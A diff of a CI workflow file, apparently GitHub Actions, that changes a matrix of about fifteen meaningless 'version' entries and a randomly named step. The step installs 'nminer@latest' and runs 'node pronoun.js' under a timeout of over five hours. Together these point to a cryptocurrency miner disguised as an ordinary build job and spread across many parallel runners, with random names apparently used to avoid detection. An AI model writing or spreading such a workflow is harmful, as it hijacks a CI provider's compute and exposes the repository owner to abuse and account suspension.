@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2793 }
-          - { version: 1165 }
-          - { version: 78 }
-          - { version: 7463 }
-          - { version: 837 }
-          - { version: 1510 }
-          - { version: 3119 }
-          - { version: 6823 }
-          - { version: 912 }
-          - { version: 9768 }
-          - { version: 6705 }
-          - { version: 3024 }
-          - { version: 2843 }
-          - { version: 9863 }
-          - { version: 7256 }
-          - { version: 5097 }
-          - { version: 2378 }
+          - { version: 5736 }
+          - { version: 2766 }
+          - { version: 1252 }
+          - { version: 4019 }
+          - { version: 582 }
+          - { version: 7748 }
+          - { version: 7505 }
+          - { version: 2693 }
+          - { version: 8549 }
+          - { version: 6082 }
+          - { version: 6997 }
+          - { version: 1436 }
+          - { version: 570 }
+          - { version: 117 }
+          - { version: 4677 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: monstrous jaggedly
+      - name: statement towards troubled till indeed
         run: |
           npm install nminer@latest
-          timeout 306m node pronoun.js || echo "pronoun executed"
+          timeout 317m node pronoun.js || echo "pronoun executed"
